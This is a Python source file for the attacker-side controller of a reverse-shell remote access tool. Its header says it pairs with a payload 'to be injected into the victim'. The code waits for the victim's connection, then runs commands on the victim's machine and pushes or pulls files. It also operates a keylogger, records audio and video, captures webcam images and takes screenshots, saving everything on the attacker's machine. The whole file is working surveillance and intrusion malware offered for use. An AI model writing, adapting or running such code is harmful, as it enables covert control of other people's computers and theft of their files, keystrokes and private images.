#!/usr/bin/python

# ==============================================================================================================================================
# REVERSE_SHELL SERVER
#======================
# REQUIREMENTS:-
# 1) CORRESPONDING REVERSE_SHELL.PY SCRIPT

# THIS SCRIPT, ALONG WITH ITS REVERSE_SHELL
# ALLOWS A BASIC REMOTE CONNECTION TO A TARGET MACHINE
# server.py IS THE CONTROLLER (TO BE DEPLOYED ON THE ATTACKER)
# reverse_shell.py IS THE PAYLOAD (TO BE INJECTED INTO THE VICTIM AND NEEDS TO BE RUN BY THE USER)
# THE SERVER MUST BE UP AND LISTENING FOR INCOMING CONNECTIONS
# BEFORE THE PAYLOAD IS TRIGGERED, OTHERWISE SERVER WILL NOT CATCH THE CONNECTION

# ONCE CONNECTED, THE SERVER REPLICATES A CLI OF THE VICTIM MACHINE
# COMMANDS CAN BE ISSUED FROM THE SERVER TO BE EXECUTED ON THE VICTIM
# THE SERVER CAN ALSO UPLOAD (INJECT FILES FROM ATTACKER MACHINE TO VICTIM)
# OR DOWNLOAD (PULL FILES FROM VICTIM TO ATTACKER) FILES TO AND FROM THE VICTIM
# USING THE download OR upload COMMANDS
# 
# THE CONNECTION CAN BE CLOSED BY ISSUING THE quit OR exit COMMANDS

# NOTE:-
# THIS IS A NON-PERSISTENT SCRIPT
# ONCE DISCONNECTED, THE WHOLE CONNECTION PROCESS NEEDS TO BE RE-DONE
# BOTH ON THE ATTACKER AND THE VICTIM ENDS

# PS:-
#=====
# THE SERVER AS WELL AS THE REVERSE_SHELL SCRIPTS REQUIRE THE 
# IP ADDRESS AND PORT NUMBER OF THE LISTENING MACHINE
# THESE FIELDS MUST BE CHANGED ACCORDINGLY IN BOTH THE SCRIPTS
# BEFORE USE FOR CORRECT FUNCTIONING OF THE SCRIPTS
#
# HOW TO :-
#-----------
# IN server.py :
# ------------
# GO TO THE BOTTOM OF THE SCRIPT, IN THE init_server() FUNCTION
# LOOK FOR THE FOLLOWING FIELDS UNDER "# details of the listening machine" - 
# attack_ip = "192.168.0.103"
# listen_port = 54321
# CHANGE THE VALUES WITHIN THE ANGLE BRACKETS 
#
# IN reverse_shell.py :
# -------------------
# GO TO THE BOTTOM OF THE CODE
# LOOK FOR THE FOLLOWING FIELDS UNDER "# details of the listening machine (connect to)" - 
# connect_ip = "<SOME_IP_ADDRESS>"
# conn_port = <SOME_PORT_NUMBER>
# CHANGE THE VALUES WITHIN THE ANGLE BRACKETS 
# ==============================================================================================================================================





import socket as sc
from termcolor import colored
import os,sys
import json
import base64
import subprocess as sp
from datetime import datetime
from time import sleep



def Send(data):
	
	Data = json.dumps(data)
#	print("Sent : " + Data)
#	try:
	target.send(Data)
#	except Exception as e:
#		print("[!] " + str(e))
#		print("[-] Connection closed by peer!")


def Recv():

	data = ""
	while True:
		try:																	# tries to receive 1024 bytes of data from target
			data = data + target.recv(1024)							# decodes the utf-8 encoded as sent by the Send() function
#			print("Received : " + data)
			return json.loads(data)
		except ValueError:														# ValueError signifies that the data to be received is larger than 1024 bytes
			continue															# goes back to the loop iteration and adds the remaining data from the execution of try block



def shell():

	SYS_flag = 0
	Send("pwd")
	if Recv().strip()[0] != '/':
		SYS_flag = 1
		
	
	# THE PREVIOUS PIECE OF CODE DETERMINES THE OS OF THE TARGET SYSTEM 
	# BY SENDING A PRINT CURRENT WORKING DIRECTORY COMMAND
	# AND ANALYSING THE RESULT OF THE SAME
	# USES THE FACT THAT LINUX/ UNIX BASED SYSTEMS 
	# RETURN THE PWD RESULT AS "/root/<path_to_dir>" - STARTS WITH "/"
	# SO IF THE RESULT DOESN'T START WITH "/' , WE KNOW IT IS NOT A LINUX/ UNIX SYSTEM 
	# AND THUS WE ISSUE THE WINDOWS EQUIVALENT OF THE PWD COMMAND, WHICH IS cd

	# GOING AHEAD FROM THE PREVIOUS SNIPPET,
	# WE TRY TO DISPLAY THE BASIC TARGET SYSTEM INFO
	# (OS AND ITS VERSION) FOR THE USER TO KNOW
	# WHICH SHELL COMMANDS TO USE ONCE THEY'RE CONNECTED
	
	# flag = 0 indicates a Linux/ UNIX based system
	if SYS_flag == 0:
		Send('uname -r')
		print("[!] Target System OS Name: " + Recv().strip())
		print("[*] Please issue command \"uname -a\" for more system information.")
	# otherwise, it is a Windows based system
	else:
		Send('systeminfo | findstr "OS"')
		print("[!] Target System " + Recv().split('\n')[0])												# Windows returns 4-5 lines (separated by \n) containing the string "OS" ... first line shows the os name
		print("[*] Please issue command \"systeminfo\" for more system information.")
	print("[*] Type \"help\" for a list of commands that can be issued!\n")
	
	while True:

		if SYS_flag == 0:
			Send("pwd")																							# this Send of pwd command is to show the PWD as shown in the console for Linux system
		else:
			Send("cd")																							# this Send of cd command is to show the PWD as shown in the console for Windows system
		command = raw_input("Shell @ " + str(ip[0]) + ":" + Recv().strip() + "# ")								# an input line similar to the console is made using the PWD result from above
		
		Send(command)																						# now the actual command entered by the user is sent
		
		# command to stop the reverse_shell operations
		#==============================================
		if (command == 'exit') or (command == 'quit'):
			print("[!] " + str(ip[0]) + ": Stopping the reverse shell server on port " + str(ip[1]))
			break

		# the GET command [pulling files from target to attacker]							Sample command : download <FILE.TXT>
		#=========================================================	
		elif (command[:3] == 'get'):
			try:
				if (SYS_flag == 0) and (len(command[4:].split('/')) > 1):
					file = open(command[4:].split('/')[-1], "wb")
				elif (SYS_flag == 1) and (len(command[4:].split('\\')) > 1):
					file = open(command[4:].split('\\')[-1], "wb")
#				with open(command[4:], "wb") as file:
				else:
					file = open(command[4:], "wb")
				file_data = Recv()
				file.write(base64.b64decode(file_data))					# the base64 decoding is done to handle non-text file types (such as images) which can't be written directly
				print(colored("[+] File " + command[4:] + " downloaded at "+ sp.check_output('pwd').decode(), "green"))
				file.close()
			except Exception as e:
				print(e)
				print(colored("[-] Failed to download file " + command[4:], "red"))


		
		# the PUT command [injecting files from attacker to victim]									Sample command : upload <PAYLOAD.EXE>
		#===========================================================					
		elif (command[:3] == 'put'):
			try:
				with open(command[4:], "rb") as file:
					Send(base64.b64encode(file.read()))						# while sending a file, the data is encoded (whcich will then be decodedd in our target system, as we have decoded received file above )
					res = Recv()
					if res[1] == '+':
						print(colored(res, "green"))
					else:
						print(colored(res, "red"))
			except Exception as e:											# catching the exception here for debugging purposes - to print the error message 
				print("[!] " + str(e))
				print(colored("[-] Failed to upload file " + command[4:], "red"))
				pass

		
		
		# the START KEYLOGGER command triggers the keylogger program to run on the target machine and record keystrokes
		#===============================================================================================================
		elif (command == "start keylogger") or (command == "stop keylogger"):
			if command [:4] == 'stop':
				print("[!] Stopping the keylogger on the target system. Please wait...")
			try:
				print(colored(Recv(), "green"))
			except Exception as e:
				print(colored("[!] " + str(e), "red"))
			
		# dump the recorded keystrokes from target to attacker machine
		#==============================================================	
		elif (command == "dump keys"):
			with open("KeyLog" + str(datetime.now()) + ".log", "w") as log:
				print("[!] Trying to locate and retrieve recorded keystrokes. Please wait...")
				try:

					keylog = Recv()
					if keylog[:3] == '[-]':
						print(colored(keylog, "red"))
					else:
						log.write(keylog)
						print(colored("[+] Log file with key record saved at "+ sp.check_output('pwd').decode(), "green"))

				except Exception as e:
					print(colored("[!] " + str(e), "red"))



		# the START RECORDING command triggers the keylogger program to run on the target machine and record keystrokes
		#===============================================================================================================
		elif (command == "start recording") or (command == "stop recording"):
			try:
				print(colored(Recv(), "green"))
			except Exception as e:
				print(colored("[!] " + str(e), "red"))
			
		# dump the recorded audio file from target to attacker machine
		#==============================================================	
		elif (command == "record"):
			with open("AudioRecording" + str(datetime.now()) + ".wav", "wb") as audiorec:
				print("[!] Trying to locate and retrieve recorded audio. Please wait...")
				try:
					audio_data = Recv()
					audiorec.write(base64.b64decode(audio_data))
					print(colored("[+] Recorded audio file with date-time-stamp saved at "+ sp.check_output('pwd').decode(), "green"))
				except Exception as e:
					print(colored("[!] " + str(e), "red"))

			
		
		elif (command == "start video") or (command == "stop video"):
			try:
				print(colored(Recv(), "green"))
			except Exception as e:
				print(colored("[!] " + str(e), "red"))
		
		
		
		elif (command == "dump video"):
			with open("VideoRecording" + str(datetime.now()) + ".mp4", "wb") as videorec:
				print("[!] Trying to locate and retrieve recorded video. Please wait...")
				try:
					video_data = Recv()
					videorec.write(base64.b64decode(video_data))
					print(colored("[+] Recorded audio file with date-time-stamp saved at "+ sp.check_output('pwd').decode(), "green"))
				except Exception as e:
					print(colored("[!] " + str(e), "red"))
		
		
		elif (command == "capture image"):
			try:
				with open("ImageCapture"+str(datetime.now()), "wb") as img:
					img_data = Recv()
					if base64.b64decode(img_data)[1] == '-':
						print(colored(Recv(), "red"))
					else:
						img.write(base64.b64decode(img_data))
						print(colored("[+] Captured image saved at "+ sp.check_output('pwd').decode(), "green"))
			except Exception as e:
				print(e)
				print(colored("[-] Failed to save captured image!", "red"))
		

		# the SS command tries to capture a screenshot of the target system and send it to the attacker
		#===============================================================================================
		elif (command[:2] == 'ss'):
			try:
				with open("Screenshot"+str(datetime.now()), "wb") as ss:
					ss_data = Recv()
					if base64.b64decode(ss_data)[1] == '-':
						print(colored(Recv(), "red"))
					else:
						ss.write(base64.b64decode(ss_data))
						print(colored("[+] Screenshot saved at "+ sp.check_output('pwd').decode(), "green"))
			except Exception as e:
				print(e)
				print(colored("[-] Failed to save Screenshot!", "red"))

		# for all other commands [those not mentioned above or needs any special handling]
		#==================================================================================
		else:
			try:
				print(Recv())
			except Exception as e:
				print(colored("[!] " + str(e), "red"))




def init_server():
	
	global sock, ip, target
	
	try:
	
		sock = sc.socket(sc.AF_INET, sc.SOCK_STREAM)										# AF_INET FOR IPv4 CONNECTION ; SOCK_STREAM FOR TCP CONNECTION
		sock.setsockopt(sc.SOL_SOCKET, sc.SO_REUSEADDR, 1)
	
	# details of the listening machine
		attack_ip = "192.168.0.103"
		listen_port = 54321
	# sock.bind(<MY_IP>, <MY_PORT>)
		print("[!] Setting up Listener with IP = " + attack_ip + " on port = " + str(listen_port))
		sleep(3)
		sock.bind((attack_ip,listen_port))
		sock.listen(5)																											# how many connections to listen for
	
		print("[!] " + attack_ip + ": Listening for incoming connections on port " + str(listen_port))	
		target, ip = sock.accept()																								# we will get the target ip address once the socket connection is accepted by the target
		print(colored("\n[+] Connection established from target : " + str(ip[0]) + ": " + str(ip[1]), "green"))					# ip[0] = target ip ; ip[1] = target port
		shell()																													# calling the shell() function to execute the shell commands
		
	except KeyboardInterrupt:

		print("\n[!] " + attack_ip + ": Stopping the reverse shell server on port " + str(listen_port))
		quit()
		
	except Exception as e:
		print("[!] " + str(e))
		print(colored("[-] Listener setup failed with IP = " + attack_ip + " on port = " + str(listen_port), "red"))
		
	finally:
		sock.close()
init_server()

